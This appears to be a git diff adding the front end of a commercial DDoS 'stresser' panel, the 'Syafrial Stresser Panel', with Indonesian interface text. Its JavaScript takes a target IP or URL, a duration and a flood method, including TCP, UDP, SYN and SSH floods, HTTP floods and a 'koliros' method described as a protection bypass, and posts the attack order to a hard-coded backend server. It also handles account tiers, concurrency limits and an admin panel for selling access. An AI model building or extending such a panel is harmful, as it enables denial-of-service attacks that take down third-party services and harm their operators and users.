@@ -3,289 +3,1045 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Stresser Panel</title>
+  <title>Syafrial Stresser Panel</title>
   <style>
-    body {
-      background-color: #121212;
-      color: #eee;
-      font-family: sans-serif;
+    * { 
+      box-sizing: border-box;
       margin: 0;
+      padding: 0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
     }
-    header {
-      background: #1f1f1f;
-      padding: 10px 20px;
+    
+    body {
+      background: linear-gradient(135deg, #1a2a6c, #b21f1f, #fdbb2d);
+      background-size: 400% 400%;
+      animation: gradient 15s ease infinite;
+      color: #fff;
+      min-height: 100vh;
+      padding: 20px;
+    }
+    
+    @keyframes gradient {
+      0% { background-position: 0% 50%; }
+      50% { background-position: 100% 50%; }
+      100% { background-position: 0% 50%; }
+    }
+    
+    .card {
+      background: rgba(0,0,0,0.8);
+      padding: 25px;
+      margin: 20px auto;
+      max-width: 800px;
+      border-radius: 15px;
+      box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+      border: 1px solid rgba(255,255,255,0.1);
+    }
+    
+    h2, h3 { 
+      text-align: center;
+      margin-bottom: 20px;
+      color: #fff;
+    }
+    
+    input, select, button {
+      width: 100%;
+      padding: 12px 15px;
+      margin: 10px 0;
+      border: none;
+      border-radius: 8px;
+      font-size: 16px;
+      transition: all 0.3s;
+    }
+    
+    input, select {
+      background: rgba(30,30,30,0.8);
+      color: #fff;
+      border: 1px solid #444;
+    }
+    
+    input:focus, select:focus {
+      outline: none;
+      border-color: #007BFF;
+      box-shadow: 0 0 0 2px rgba(0,123,255,0.25);
+    }
+    
+    button {
+      background: #007BFF;
+      color: white;
+      cursor: pointer;
+      font-weight: bold;
+      letter-spacing: 0.5px;
+    }
+    
+    button:hover { 
+      background: #0069d9;
+      transform: translateY(-2px);
+      box-shadow: 0 4px 8px rgba(0,0,0,0.2);
+    }
+    
+    .hidden { display: none; }
+    
+    #menuToggle {
+      position: fixed;
+      top: 15px;
+      right: 20px;
+      font-size: 28px;
+      cursor: pointer;
+      z-index: 10;
+      color: #fff;
+      display: none;
+      background: rgba(0,0,0,0.7);
+      width: 40px;
+      height: 40px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      box-shadow: 0 2px 5px rgba(0,0,0,0.2);
+    }
+    
+    #menuDropdown {
+      position: fixed;
+      top: 70px;
+      right: 20px;
+      background: #111;
+      border-radius: 10px;
+      overflow: hidden;
+      display: none;
+      z-index: 10;
+      box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+      border: 1px solid #333;
+    }
+    
+    #menuDropdown button {
+      background: none;
+      border: none;
+      color: #fff;
+      padding: 12px 20px;
+      width: 180px;
+      text-align: left;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+    
+    #menuDropdown button:hover { 
+      background: #222;
+      transform: none;
+      box-shadow: none;
+    }
+    
+    #menuDropdown button i {
+      width: 20px;
+      text-align: center;
+    }
+    
+    /* Dashboard Styles */
+    .dashboard-header {
       display: flex;
       justify-content: space-between;
       align-items: center;
+      margin-bottom: 25px;
+      padding-bottom: 15px;
+      border-bottom: 1px solid rgba(255,255,255,0.1);
     }
-    main {
-      padding: 20px;
+    
+    .dashboard-header h2 {
+      margin: 0;
+      text-align: left;
+      font-size: 24px;
     }
-    button {
-      background: #444;
-      color: white;
-      border: none;
-      padding: 8px 14px;
-      margin: 3px;
-      cursor: pointer;
-      border-radius: 5px;
+    
+    .user-status {
+      display: flex;
+      gap: 10px;
     }
-    input, select {
-      padding: 8px;
-      margin: 5px 0;
-      border-radius: 5px;
-      border: 1px solid #444;
-      background: #222;
-      color: white;
-      width: 100%;
-    }
-    .hidden {
-      display: none;
-    }
-    .card {
-      background: #1f1f1f;
-      padding: 20px;
-      border-radius: 8px;
-      margin-bottom: 20px;
-    }
-    .admin-only {
-      display: none;
-    }
-    #signup-btn {
-      position: fixed;
-      bottom: 10px;
-      right: 10px;
+    
+    .status-badge {
+      padding: 5px 12px;
+      border-radius: 20px;
       font-size: 12px;
+      font-weight: bold;
+      text-transform: uppercase;
+    }
+    
+    .status-badge.premium {
+      background: linear-gradient(90deg, #ff9a9e 0%, #fad0c4 100%);
+      color: #000;
+    }
+    
+    .status-badge.active {
+      background: linear-gradient(90deg, #a1c4fd 0%, #c2e9fb 100%);
+      color: #000;
+    }
+    
+    .stats-grid {
+      display: grid;
+      grid-template-columns: repeat(2, 1fr);
+      gap: 15px;
+      margin-bottom: 30px;
+    }
+    
+    .stat-card {
+      background: rgba(255,255,255,0.05);
+      border-radius: 12px;
+      padding: 20px;
+      text-align: center;
+      transition: transform 0.3s;
+      border: 1px solid rgba(255,255,255,0.1);
+    }
+    
+    .stat-card:hover {
+      transform: translateY(-5px);
+      background: rgba(255,255,255,0.1);
+    }
+    
+    .stat-icon {
+      font-size: 30px;
+      margin-bottom: 10px;
+    }
+    
+    .stat-value {
+      font-size: 28px;
+      font-weight: bold;
+      margin-bottom: 5px;
+      background: linear-gradient(90deg, #fff, #aaa);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+    }
+    
+    .stat-label {
+      font-size: 14px;
+      color: #aaa;
+    }
+    
+    .active-users-section {
+      margin-top: 30px;
+    }
+    
+    .active-users-section h3 {
+      text-align: left;
+      margin-bottom: 15px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+    
+    .crown-icon {
+      color: gold;
+    }
+    
+    .active-users-list {
+      background: rgba(0,0,0,0.3);
+      border-radius: 10px;
+      padding: 15px;
+      max-height: 300px;
+      overflow-y: auto;
+    }
+    
+    .active-user {
+      display: flex;
+      justify-content: space-between;
+      padding: 12px 15px;
+      margin: 8px 0;
+      border-radius: 8px;
+      background: rgba(255,255,255,0.05);
+      align-items: center;
+      transition: all 0.3s;
+    }
+    
+    .active-user:hover {
+      background: rgba(255,255,255,0.1);
+    }
+    
+    .active-user.admin {
+      background: linear-gradient(to right, rgba(20,20,20,0.8), rgba(50,50,50,0.8));
+      border-left: 3px solid gold;
+    }
+    
+    .admin-badge {
+      color: gold;
+      margin-right: 8px;
+    }
+    
+    .username {
+      display: flex;
+      align-items: center;
+    }
+    
+    .badge {
+      font-size: 10px;
+      background: gold;
+      color: #000;
+      padding: 2px 8px;
+      border-radius: 10px;
+      margin-left: 8px;
+      font-weight: bold;
+    }
+    
+    .activity {
+      font-size: 13px;
+      color: #aaa;
+    }
+    
+    .quick-actions {
+      display: grid;
+      grid-template-columns: 1fr;
+      gap: 15px;
+      margin-top: 25px;
+    }
+    
+    .action-btn {
+      padding: 15px;
+      border-radius: 10px;
+      font-weight: bold;
+      font-size: 16px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      transition: all 0.3s;
+    }
+    
+    .attack-btn {
+      background: linear-gradient(90deg, #ff416c, #ff4b2b);
+    }
+    
+    .stats-btn {
+      background: linear-gradient(90deg, #4776E6, #8E54E9);
+    }
+    
+    .action-btn:hover {
+      transform: translateY(-3px);
+      box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+    }
+    
+    /* Attack Panel Styles */
+    .method-info {
+      font-size: 13px;
+      color: #aaa;
+      margin-top: 5px;
+      padding: 10px;
+      background: rgba(0,0,0,0.3);
+      border-radius: 5px;
+    }
+    
+    .attack-status {
+      margin-top: 15px;
+      padding: 15px;
       background: #333;
+      border-radius: 10px;
+      text-align: center;
+      font-weight: bold;
+    }
+    
+    .active-attack {
+      background: rgba(0,123,255,0.1);
+      padding: 12px;
+      margin: 10px 0;
+      border-radius: 8px;
+      border-left: 3px solid #007BFF;
+    }
+    
+    /* Admin Panel Styles */
+    .userItem {
+      background: rgba(255,255,255,0.05);
+      margin: 10px 0;
+      padding: 15px;
+      border-radius: 10px;
+      border: 1px solid rgba(255,255,255,0.1);
+    }
+    
+    .inline-buttons {
+      display: flex;
+      gap: 8px;
+      margin-top: 10px;
+    }
+    
+    .inline-buttons button {
+      padding: 8px 12px;
+      font-size: 13px;
+      border-radius: 5px;
+    }
+    
+    /* Scrollbar Styles */
+    ::-webkit-scrollbar {
+      width: 8px;
+    }
+    
+    ::-webkit-scrollbar-track {
+      background: rgba(0,0,0,0.2);
+      border-radius: 10px;
+    }
+    
+    ::-webkit-scrollbar-thumb {
+      background: rgba(255,255,255,0.2);
+      border-radius: 10px;
+    }
+    
+    ::-webkit-scrollbar-thumb:hover {
+      background: rgba(255,255,255,0.3);
+    }
+    
+    /* Responsive Design */
+    @media (max-width: 768px) {
+      .card {
+        padding: 20px;
+        margin: 15px auto;
+      }
+      
+      .stats-grid {
+        grid-template-columns: 1fr;
+      }
+      
+      .dashboard-header {
+        flex-direction: column;
+        align-items: flex-start;
+        gap: 10px;
+      }
     }
   </style>
 </head>
 <body>
+  <div id="menuToggle" onclick="toggleMenu()">⋮</div>
+  <div id="menuDropdown"></div>
 
-  <!-- Navbar, disembunyikan sampai login -->
-  <header id="nav" class="hidden">
-    <h2>Stresser Panel</h2>
-    <div>
-      <button onclick="showPage('dashboard')">Dashboard</button>
-      <button onclick="showPage('attack')">Attack</button>
-      <button onclick="showPage('history')">History</button>
-      <button onclick="showPage('owner')">Owner</button>
-      <button class="admin-only" onclick="showPage('admin')">Admin</button>
-      <button onclick="logout()">Logout</button>
+  <!-- LOGIN -->
+  <div id="login" class="card">
+    <h2>Login</h2>
+    <input id="loginUser" placeholder="Username" />
+    <input id="loginPass" type="password" placeholder="Password" />
+    <button onclick="login()">Login</button>
+    <p style="text-align: center; margin-top: 15px;">Belum punya akun? <a href="#" onclick="toggleSignup(true)" style="color: #007BFF;">Daftar disini</a></p>
+    <div style="font-size: 12px; text-align: center; margin-top: 20px; color: #aaa;">
+      Untuk pengguna baru: Sign up manual hanya dapat akses attack 30s, conc 1<br>
+      Waktu akun baru hanya 3 hari
     </div>
-  </header>
+  </div>
 
-  <main>
-    <!-- LOGIN PAGE -->
-    <div id="login">
-      <h3>Login</h3>
-      <input type="text" id="login-username" placeholder="Username" />
-      <input type="password" id="login-password" placeholder="Password" />
-      <button onclick="login()">Login</button>
+  <!-- SIGNUP -->
+  <div id="signup" class="card hidden">
+    <h2>Sign Up</h2>
+    <input id="signupUser" placeholder="Username" />
+    <input id="signupPass" type="password" placeholder="Password" />
+    <button onclick="signup()">Daftar</button>
+    <p style="text-align: center; margin-top: 15px;">Sudah punya akun? <a href="#" onclick="toggleSignup(false)" style="color: #007BFF;">Login disini</a></p>
+    <div class="promo-banner" style="margin-top: 20px; padding: 15px; background: linear-gradient(to right, #ff416c, #ff4b2b); border-radius: 8px; text-align: center;">
+      <p style="font-weight: bold; margin-bottom: 5px;">Selamat datang di Syafrial Stresser</p>
+      <p style="font-size: 14px;">Untuk bantuan, kontak: lolpopstresser</p>
     </div>
+  </div>
 
-    <!-- DASHBOARD -->
-    <div id="dashboard" class="hidden">
-      <div class="card">
-        <h3>Selamat datang!</h3>
-        <p>Ini adalah panel stresser yang dibuat oleh <b>Syafrial</b>.</p>
-        <p><b>Status:</b> <span id="status"></span></p>
-        <p><b>Expiry:</b> <span id="expiry"></span></p>
+  <!-- DASHBOARD -->
+  <div id="dashboard" class="card hidden">
+    <div class="dashboard-header">
+      <h2>👋 Selamat datang, <span id="currentUser">User</span>!</h2>
+      <div class="user-status" id="userStatus">
+        <span class="status-badge premium">PREMIUM</span>
+        <span class="status-badge active">AKTIF</span>
       </div>
     </div>
 
-    <!-- ATTACK -->
-    <div id="attack" class="hidden">
-      <div class="card">
-        <h3>Attack Panel</h3>
-        <select id="method">
-          <option value="L4">L4</option>
-          <option value="L7">L7</option>
-        </select>
-        <input type="text" id="target" placeholder="Target URL/IP" />
-        <input type="number" id="duration" placeholder="Durasi (detik)" />
-        <button onclick="sendAttack()">Send Attack</button>
+    <div class="stats-grid">
+      <div class="stat-card">
+        <div class="stat-icon">⏱️</div>
+        <div class="stat-value" id="timeLeft">3 Hari</div>
+        <div class="stat-label">Masa Aktif</div>
+      </div>
+      <div class="stat-card">
+        <div class="stat-icon">⚡</div>
+        <div class="stat-value" id="totalAttacks">0</div>
+        <div class="stat-label">Total Serangan</div>
+      </div>
+      <div class="stat-card">
+        <div class="stat-icon">🔗</div>
+        <div class="stat-value" id="userConc">1</div>
+        <div class="stat-label">Concurrent</div>
+      </div>
+      <div class="stat-card">
+        <div class="stat-icon">⏰</div>
+        <div class="stat-value" id="userMaxTime">30s</div>
+        <div class="stat-label">Max Duration</div>
       </div>
     </div>
 
-    <!-- HISTORY -->
-    <div id="history" class="hidden">
-      <div class="card">
-        <h3>Riwayat Serangan</h3>
-        <ul id="history-list"></ul>
+    <div class="active-users-section">
+      <h3><span class="crown-icon">👑</span> Pengguna Aktif</h3>
+      <div class="active-users-list" id="activeUsersList">
+        <!-- Active users will be loaded here -->
       </div>
     </div>
 
-    <!-- ADMIN PANEL -->
-    <div id="admin" class="hidden">
-      <div class="card">
-        <h3>Admin Panel - Tambah User</h3>
-        <input id="new-username" placeholder="Username" />
-        <input id="new-password" placeholder="Password" />
-        <input id="new-conc" type="number" placeholder="Concurrent" />
-        <input id="new-time" type="number" placeholder="Time Limit (detik)" />
-        <input id="new-expiry" type="date" />
-        <select id="new-admin">
-          <option value="false">User</option>
-          <option value="true">Admin</option>
-        </select>
-        <button onclick="addUser()">Tambah</button>
+    <div class="quick-actions">
+      <button class="action-btn attack-btn" onclick="showPage('attack')">
+        🚀 Launch Attack
+      </button>
+      <button class="action-btn stats-btn" onclick="showStats()">
+        📊 Lihat Statistik
+      </button>
+    </div>
+  </div>
+
+  <!-- ATTACK PANEL -->
+  <div id="attack" class="card hidden">
+    <h2>Attack Panel</h2>
+    <input id="target" placeholder="Target (IP atau URL)" />
+    <input id="duration" type="number" placeholder="Durasi (detik)" />
+    <select id="layer" onchange="updateMethods()">
+      <option value="L4">Layer 4</option>
+      <option value="L7">Layer 7</option>
+    </select>
+    <select id="method" onchange="updateMethodDescription()"></select>
+    <div id="methodDescription" class="method-info"></div>
+    <button onclick="startAttack()">Start Attack</button>
+    <div id="attackStatus" class="attack-status hidden"></div>
+    <div id="activeAttacks">
+      <h3 style="margin-top: 20px;">Serangan Aktif Anda</h3>
+      <div id="currentAttacksList">
+        <p style="text-align: center; color: #aaa;">Tidak ada serangan aktif</p>
       </div>
     </div>
+  </div>
 
-    <!-- OWNER -->
-    <div id="owner" class="hidden">
-      <div class="card">
-        <h3>Owner</h3>
-        <p>Hubungi <b>Syafrial</b> melalui Telegram: @syafrialcontact</p>
-      </div>
-    </div>
-  </main>
-
-  <!-- SIGN UP -->
-  <button id="signup-btn" onclick="signupPrompt()">Sign up</button>
+  <!-- ADMIN PANEL -->
+  <div id="admin" class="card hidden">
+    <h2>Admin Panel</h2>
+    <input id="adminUser" placeholder="Username" />
+    <input id="adminPass" placeholder="Password" />
+    <input id="adminDays" type="number" placeholder="Durasi (hari)" />
+    <input id="adminConc" type="number" placeholder="Concurrents" />
+    <input id="adminTimeLimit" type="number" placeholder="Time Limit (detik)" />
+    <button onclick="addUser()">Add User</button>
+    <h3 style="margin-top: 20px;">Daftar User</h3>
+    <div id="userList"></div>
+  </div>
 
   <script>
-    const API_URL = "https://hospitable-bravery-production.up.railway.app/api";
+    const panelAPI = "http://128.199.219.185:3000";
+    const attackAPI = "http://128.199.219.185:8082/api/start-attack";
     let currentUser = null;
+    let activeUsersInterval = null;
+    let cooldownInterval = null;
+    let activeAttacks = [];
+    let cooldownTime = 0;
 
-    function showPage(id) {
-      document.querySelectorAll('main > div').forEach(el => el.classList.add('hidden'));
-      document.getElementById(id).classList.remove('hidden');
+    // Method descriptions
+    const methodDescriptions = {
+      "tcp": "TCP Flood - Mengirim paket TCP secara masif ke target",
+      "udp": "UDP Flood - Mengirim paket UDP secara masif ke target",
+      "syn": "SYN Flood - Mengirim permintaan SYN untuk membanjiri koneksi TCP",
+      "sshflood": "SSH Flood - Menyerang layanan SSH dengan permintaan koneksi",
+      "http": "HTTP Flood - Mengirim permintaan HTTP secara masif",
+      "browser": "Browser Emulation - Meniru perilaku browser nyata",
+      "flood": "Generic Flood - Serangan flood generik layer 7",
+      "mix": "Mixed Methods - Kombinasi beberapa metode serangan",
+      "sigma": "Sigma Method - Metode canggih dengan pola khusus",
+      "koliros": "Koliros Method - Metode khusus untuk bypass proteksi",
+      "blast": "BLAST - Serangan sangat cepat dengan payload minimal"
+    };
+
+    function toggleSignup(show) {
+      document.getElementById("login").classList.toggle("hidden", show);
+      document.getElementById("signup").classList.toggle("hidden", !show);
     }
 
-    function login() {
-      const username = document.getElementById("login-username").value;
-      const password = document.getElementById("login-password").value;
+    function toggleMenu() {
+      const menu = document.getElementById("menuDropdown");
+      menu.style.display = menu.style.display === "block" ? "none" : "block";
+    }
 
-      fetch(API_URL + "/login", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ username, password })
-      })
-      .then(res => res.json())
-      .then(data => {
-        if (data.error) return alert(data.error);
-        currentUser = data;
-        document.getElementById("status").innerText = "Aktif";
-        document.getElementById("expiry").innerText = data.expiry;
-
-        document.getElementById("nav").classList.remove("hidden");
-        if (data.isAdmin) {
-          document.querySelectorAll(".admin-only").forEach(el => el.style.display = 'inline');
-        }
-        showPage('dashboard');
-        loadHistory();
+    function renderMenu() {
+      const menu = document.getElementById("menuDropdown");
+      menu.innerHTML = "";
+      
+      const menuItems = [
+        { page: "dashboard", icon: "📊", text: "Dashboard" },
+        { page: "attack", icon: "⚔️", text: "Attack Panel" }
+      ];
+      
+      if (currentUser?.isAdmin) {
+        menuItems.push({ page: "admin", icon: "👑", text: "Admin Panel" });
+      }
+      
+      menuItems.push({ page: "logout", icon: "🚪", text: "Logout" });
+      
+      menuItems.forEach(item => {
+        const btn = document.createElement("button");
+        btn.innerHTML = `<i>${item.icon}</i> ${item.text}`;
+        btn.onclick = () => {
+          if (item.page === "logout") logout();
+          else showPage(item.page);
+        };
+        menu.appendChild(btn);
       });
+    }
+
+    function showPage(page) {
+      document.querySelectorAll(".card").forEach(el => el.classList.add("hidden"));
+      const el = document.getElementById(page);
+      if (el) el.classList.remove("hidden");
+      
+      if (page !== "login" && page !== "signup") {
+        document.getElementById("menuToggle").style.display = "flex";
+        renderMenu();
+        
+        if (page === "admin") loadUsers();
+        if (page === "dashboard") {
+          document.getElementById("currentUser").innerText = currentUser?.username || "";
+          loadUserStats();
+          fetchActiveUsers();
+          startActiveUsersPolling();
+        }
+        if (page === "attack") {
+          updateMethods();
+          updateActiveAttacksList();
+        }
+      } else {
+        document.getElementById("menuToggle").style.display = "none";
+        document.getElementById("menuDropdown").style.display = "none";
+        stopActiveUsersPolling();
+      }
+    }
+
+    async function login() {
+      const username = document.getElementById("loginUser").value;
+      const password = document.getElementById("loginPass").value;
+      
+      if (!username || !password) {
+        alert("Harap isi username dan password");
+        return;
+      }
+      
+      try {
+        const res = await fetch(`${panelAPI}/api/login`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ username, password })
+        });
+        
+        const data = await res.json();
+        
+        if (data.success) {
+          currentUser = data.user;
+          
+          // Update status badges
+          const statusElement = document.getElementById("userStatus");
+          statusElement.innerHTML = '';
+          
+          if (currentUser.isAdmin) {
+            statusElement.innerHTML += `<span class="status-badge premium">ADMIN</span>`;
+          } else if (currentUser.timeLimit > 30 || currentUser.concurrents > 1) {
+            statusElement.innerHTML += `<span class="status-badge premium">PREMIUM</span>`;
+          }
+          
+          statusElement.innerHTML += `<span class="status-badge active">AKTIF</span>`;
+          
+          showPage("dashboard");
+        } else {
+          alert(data.message || "Login gagal");
+        }
+      } catch (e) {
+        alert("Error saat login: " + e.message);
+      }
+    }
+
+    async function signup() {
+      const username = document.getElementById("signupUser").value;
+      const password = document.getElementById("signupPass").value;
+      
+      if (!username || !password) {
+        alert("Harap isi username dan password");
+        return;
+      }
+      
+      if (password.length < 6) {
+        alert("Password minimal 6 karakter");
+        return;
+      }
+      
+      try {
+        const res = await fetch(`${panelAPI}/api/add-user`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ 
+            username, 
+            password, 
+            days: 3,
+            conc: 1,
+            timeLimit: 30
+          })
+        });
+        
+        const data = await res.json();
+        
+        if (data.success) {
+          alert("Berhasil daftar! Anda mendapatkan:\n- Masa aktif 3 hari\n- Max time 30 detik\n- 1 Concurrent\nSilakan login.");
+          toggleSignup(false);
+        } else {
+          alert(data.message || "Gagal daftar");
+        }
+      } catch (e) {
+        alert("Error saat pendaftaran: " + e.message);
+      }
+    }
+
+    function updateMethods() {
+      const methodSelect = document.getElementById("method");
+      const layer = document.getElementById("layer").value;
+      const l4Methods = ["tcp", "udp", "syn", "sshflood"];
+      const l7Methods = ["http", "browser", "flood", "mix", "sigma", "koliros", "blast"];
+      const methods = layer === "L4" ? l4Methods : l7Methods;
+      
+      methodSelect.innerHTML = "";
+      methods.forEach(m => {
+        const opt = document.createElement("option");
+        opt.value = m;
+        opt.innerText = m;
+        methodSelect.appendChild(opt);
+      });
+      
+      updateMethodDescription();
+    }
+
+    function updateMethodDescription() {
+      const method = document.getElementById("method").value;
+      document.getElementById("methodDescription").textContent = methodDescriptions[method] || "";
+    }
+
+    async function startAttack() {
+      // Check if in cooldown (unless admin)
+      if (cooldownTime > 0 && !currentUser?.isAdmin) {
+        alert(`Anda dalam cooldown! Tunggu ${cooldownTime} detik lagi.`);
+        return;
+      }
+      
+      const target = document.getElementById("target").value;
+      const duration = parseInt(document.getElementById("duration").value);
+      const method = document.getElementById("method").value;
+      const layer = document.getElementById("layer").value;
+      
+      if (!target || !duration || !method) {
+        alert("Harap isi semua field!");
+        return;
+      }
+      
+      // Check max time limit (unless admin)
+      if (duration > currentUser.timeLimit && !currentUser?.isAdmin) {
+        alert(`Maxtime anda hanya ${currentUser.timeLimit} detik!`);
+        return;
+      }
+      
+      // Check concurrent attacks (unless admin)
+      if (activeAttacks.length >= currentUser.concurrents && !currentUser?.isAdmin) {
+        alert(`Anda hanya bisa memiliki ${currentUser.concurrents} serangan bersamaan!`);
+        return;
+      }
+      
+      const statusElement = document.getElementById("attackStatus");
+      statusElement.classList.remove("hidden");
+      statusElement.textContent = "Mengirim serangan...";
+      statusElement.style.color = "yellow";
+      
+      try {
+        const res = await fetch(attackAPI, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ 
+            target, 
+            duration, 
+            method,
+            layer,
+            username: currentUser?.username 
+          })
+        });
+        
+        const data = await res.json();
+        
+        if (data.success) {
+          statusElement.textContent = "Attack berhasil dikirim!";
+          statusElement.style.color = "lightgreen";
+          
+          // Add to active attacks
+          const attack = {
+            id: Date.now(),
+            target,
+            method,
+            duration,
+            startTime: new Date(),
+            endTime: new Date(Date.now() + duration * 1000)
+          };
+          
+          activeAttacks.push(attack);
+          updateActiveAttacksList();
+          
+          // Track attack in stats
+          if (!currentUser?.isAdmin) {
+            await fetch(`${panelAPI}/api/track-attack`, {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({ username: currentUser.username })
+            });
+            
+            // Update stats display
+            document.getElementById("totalAttacks").textContent = 
+              parseInt(document.getElementById("totalAttacks").textContent) + 1;
+          }
+          
+          // Start cooldown if this was the last allowed concurrent attack (unless admin)
+          if (activeAttacks.length >= currentUser.concurrents && !currentUser?.isAdmin) {
+            startCooldown(30); // 30s cooldown
+          }
+          
+          // Schedule attack removal
+          setTimeout(() => {
+            activeAttacks = activeAttacks.filter(a => a.id !== attack.id);
+            updateActiveAttacksList();
+          }, duration * 1000);
+          
+          setTimeout(() => {
+            statusElement.classList.add("hidden");
+          }, 3000);
+        } else {
+          statusElement.textContent = "Gagal: " + (data.message || "Server error");
+          statusElement.style.color = "red";
+        }
+      } catch (e) {
+        statusElement.textContent = "Error: " + e.message;
+        statusElement.style.color = "red";
+      }
+    }
+
+    function updateActiveAttacksList() {
+      const list = document.getElementById("currentAttacksList");
+      list.innerHTML = "";
+      
+      if (activeAttacks.length === 0) {
+        list.innerHTML = "<p style='text-align: center; color: #aaa;'>Tidak ada serangan aktif</p>";
+        return;
+      }
+      
+      activeAttacks.forEach(attack => {
+        const div = document.createElement("div");
+        div.className = "active-attack";
+        const remaining = Math.round((attack.endTime - Date.now()) / 1000);
+        
+        div.innerHTML = `
+          <div><strong>Target:</strong> ${attack.target}</div>
+          <div><strong>Method:</strong> ${attack.method}</div>
+          <div><strong>Waktu tersisa:</strong> ${remaining > 0 ? remaining + ' detik' : 'Selesai'}</div>
+        `;
+        
+        list.appendChild(div);
+      });
+    }
+
+    function startCooldown(seconds) {
+      cooldownTime = seconds;
+      const cooldownElement = document.getElementById("cooldownInfo");
+      cooldownElement.classList.remove("hidden");
+      
+      updateCooldownDisplay();
+      
+      cooldownInterval = setInterval(() => {
+        cooldownTime--;
+        updateCooldownDisplay();
+        
+        if (cooldownTime <= 0) {
+          clearInterval(cooldownInterval);
+          cooldownElement.classList.add("hidden");
+        }
+      }, 1000);
+    }
+
+    function updateCooldownDisplay() {
+      document.getElementById("cooldownTimer").textContent = `${cooldownTime}s`;
+    }
+
+    async function addUser() {
+      const u = document.getElementById("adminUser").value;
+      const p = document.getElementById("adminPass").value;
+      const d = parseInt(document.getElementById("adminDays").value);
+      const c = parseInt(document.getElementById("adminConc").value);
+      const t = parseInt(document.getElementById("adminTimeLimit").value);
+      
+      if (!u || !p || isNaN(d) || isNaN(c) || isNaN(t)) {
+        alert("Harap isi semua field dengan benar!");
+        return;
+      }
+      
+      if (p.length < 6) {
+        alert("Password minimal 6 karakter");
+        return;
+      }
+      
+      try {
+        const res = await fetch(`${panelAPI}/api/add-user`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ 
+            username: u, 
+            password: p, 
+            days: d, 
+            conc: c, 
+            timeLimit: t 
+          })
+        });
+        
+        const data = await res.json();
+        alert(data.success ? "User ditambahkan" : "Gagal menambah: " + (data.message || ""));
+        loadUsers();
+      } catch (e) {
+        alert("Error: " + e.message);
+      }
+    }
+
+    async function loadUsers() {
+      try {
+        const res = await fetch(`${panelAPI}/api/users`);
+        const data = await res.json();
+        const list = document.getElementById("userList");
+        list.innerHTML = "";
+        
+        if (Array.isArray(data)) {
+          data.forEach(user => {
+            const div = document.createElement("div");
+            div.className = "userItem";
+            
+            div.innerHTML = `
+              <div><strong>${user.username}</strong> ${user.isAdmin ? '👑 (admin)' : ''}</div>
+              <div>Expires: ${user.expiryDate || 'N/A'}</div>
+              <div>Concurrents: ${user.conc || 1}</div>
+              <div>Max Time: ${user.timeLimit || 30}s</div>
+            `;
+            
+            const actions = document.createElement("div");
+            actions.className = "inline-buttons";
+
+            const delBtn = document.createElement("button");
+            delBtn.textContent = "Delete";
+            delBtn.onclick = () => {
+              if (confirm(`Hapus user ${user.username}?`)) {
+                fetch(`${panelAPI}/api/delete-user`, {
+                  method: "POST",
+                  headers: { "Content-Type": "application/json" },
+                  body: JSON.stringify({ username: user.username })
+                }).then(() => loadUsers());
+              }
+            };
+
+            const makeAdminBtn = document.createElement("button");
+            makeAdminBtn.textContent = user.isAdmin ? "Demote" : "Promote";
+            makeAdminBtn.onclick = () => {
+              fetch(`${panelAPI}/api/make-admin`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ 
+                  username: user.username, 
+                  action: user.isAdmin ? "demote" : "promote" 
+                })
+              }).then(() => loadUsers());
+            };
+
+            actions.appendChild(delBtn);
+            actions.appendChild(makeAdminBtn);
+            div.appendChild(actions);
+            list.appendChild(div);
+          });
+        }
+      } catch (e) {
+        console.error("Error loading users:", e);
+      }
+    }
+
+    async function loadUserStats() {
+      if (!currentUser) return;
+      
+      try {
+        document.getElementById("timeLeft").textContent = 
+          currentUser.daysLeft ? `${currentUser.daysLeft} Hari` : "0 Hari";
+        
+        document.getElementById("totalAttacks").textContent = 
+          currentUser.totalAttacks || 0;
+        
+        document.getElementById("userConc").textContent = 
+          currentUser.concurrents || 1;
+        
+        document.getElementById("userMaxTime").textContent = 
+          currentUser.timeLimit ? `${currentUser.timeLimit}s` : "30s";
+        
+        // Update status if expired
+        if (currentUser.isExpired) {
+          const statusElement = document.getElementById("userStatus");
+          statusElement.innerHTML = '<span class="status-badge" style="background: #ff5555;">EXPIRED</span>';
+        }
+      } catch (e) {
+        console.error("Error loading user stats:", e);
+      }
+    }
+
+    async function fetchActiveUsers() {
+      try {
+        const res = await fetch(`${panelAPI}/api/active-users`);
+        const activeUsers = await res.json();
+        const list = document.getElementById('activeUsersList');
+        
+        // Clear existing users but keep the header
+        list.innerHTML = '';
+        
+        if (activeUsers.length === 0) {
+          list.innerHTML = '<p style="text-align: center; color: #aaa;">Tidak ada pengguna aktif</p>';
+          return;
+        }
+        
+        activeUsers.forEach(user => {
+          const div = document.createElement('div');
+          div.className = `active-user ${user.isAdmin ? 'admin' : ''}`;
+          
+          div.innerHTML = `
+            <span class="username">
+              ${user.isAdmin ? '<span class="admin-badge">👑</span>' : ''}
+              ${user.username}
+              ${user.isAdmin ? '<span class="badge">ADMIN</span>' : ''}
+            </span>
+            <span class="activity">${user.lastAction} (${user.time})</span>
+          `;
+          
+          list.appendChild(div);
+        });
+      } catch (e) {
+        console.error("Error loading active users:", e);
+      }
+    }
+
+    function startActiveUsersPolling() {
+      fetchActiveUsers();
+      activeUsersInterval = setInterval(fetchActiveUsers, 30000); // Update every 30 seconds
+    }
+
+    function stopActiveUsersPolling() {
+      if (activeUsersInterval) {
+        clearInterval(activeUsersInterval);
+        activeUsersInterval = null;
+      }
+    }
+
+    function showStats() {
+      alert("Fitur statistik akan segera hadir!");
     }
 
